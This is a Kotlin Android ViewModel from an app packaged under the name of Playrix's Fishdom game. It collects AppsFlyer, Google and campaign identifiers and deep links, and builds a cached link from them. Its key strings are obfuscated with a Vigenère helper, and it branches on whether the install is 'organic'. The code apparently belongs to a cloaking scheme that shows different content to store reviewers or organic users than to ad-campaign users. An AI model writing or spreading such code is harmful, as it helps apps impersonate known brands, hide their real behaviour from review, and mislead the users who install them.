package com.playrix.fishdomdd.gpl.ui

import android.content.Context
import android.net.Uri
import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.onesignal.OneSignal
import com.playrix.fishdomdd.gpl.data.source.local.preferences.LinkPreferences
import com.playrix.fishdomdd.gpl.data.web.model.TreLink
import com.playrix.fishdomdd.gpl.utils.vigenere
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class TreInitViewModel @Inject constructor(
    private val linkPreferences: LinkPreferences
) : ViewModel() {
    private val linkFlow = linkPreferences.preferencesFlow

    private val treMainLink = TreLink()

    fun treCollectLink(context: Context, callback: (String) -> Unit) {
        viewModelScope.launch {
                val link = treMainLink.treCollect(context)
                linkPreferences.updateCachedLink(link)
                callback(link)
                Log.d("TAG", "collectLink: $link")
        }
    }

    fun initLoading(callback: (String) -> Unit) = viewModelScope.launch {
        val link = linkFlow.first().cachedLink
        callback(link)
        Log.d("TAG", "initLoading: $link")
    }

    fun setUrlAndOrganic(url: String, organic: Boolean, callback: (Boolean) -> Unit) {
        treMainLink.treOrganicAccess = organic
        treMainLink.treUrl = url
        callback(url.contains("jhfe".vigenere()))
        Log.d("TAG", "setUrlAndOrganic: $url $organic")
    }

    fun treSetDeepLink(uri: Uri?) {
        treMainLink.treDeepLink = uri?.toString()
        treMainLink.treDeepLink?.let {
            val treArrayDeepLink = it.split("//")
            treMainLink.treSubAll = treArrayDeepLink[1].split("_")
        }
        Log.d("TAG", "treSetDeepLink: ${treMainLink.treDeepLink} ${treMainLink.treSubAll}")
    }

    fun treSetAfUserId(id: String) {
        treMainLink.treAppsFlyerUserId = id
    }

    fun treSetGoogleID(id: String) {
        treMainLink.treGoogleId = id
        OneSignal.setExternalUserId(id)
    }

    fun treSetAfStatus(value: String) {
        val treOrganic = "qfspyia".vigenere().replaceFirstChar { it.uppercase() }
        if (value == treOrganic && treMainLink.treDeepLink == null) {
            treMainLink.treMediaSource = "qfspyia".vigenere()
        }
    }

    fun treSetMediaSource(value: String) {
        treMainLink.treMediaSource = value
    }

    fun treSetCampaign(value: String) {
        treMainLink.treCampaign = value
        treMainLink.treCampaign?.let {
            treMainLink.treSubAll = it.split("_")
        }
    }

    fun treSetAfChannel(value: String) {
        treMainLink.treAfChannel = value
    }

    fun checkForOrganic(): Boolean {
        return treMainLink.treMediaSource == "qfspyia".vigenere() && treMainLink.treOrganicAccess == false
    }
}